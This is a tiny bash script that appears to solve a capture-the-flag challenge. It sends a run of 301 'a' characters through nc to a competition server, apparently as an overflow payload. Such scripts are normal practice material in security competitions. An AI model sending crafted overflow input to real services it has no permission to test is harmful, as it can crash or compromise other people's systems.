# it's called &borrowing, not &stealing
repeat(){
	for i in {1..301}; do echo -n "$1"; done
}

deez=$(repeat "a")
echo "$deez" | nc chal.pctf.competitivecyber.club 9999
